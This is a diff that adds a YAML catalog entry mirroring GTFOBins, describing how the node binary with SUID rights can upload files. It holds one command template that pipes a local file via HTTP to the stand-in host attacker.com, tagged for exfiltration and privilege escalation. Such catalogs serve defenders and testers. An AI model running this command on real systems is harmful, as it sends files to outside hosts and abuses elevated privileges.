@@ -1,0 +1,24 @@
+id: gtfobins/node/upload/suid
+type: binary
+platform: linux
+name: node
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+references:
+- https://gtfobins.github.io/gtfobins/node/
+tags:
+- linux
+- unix
+- gtfobins
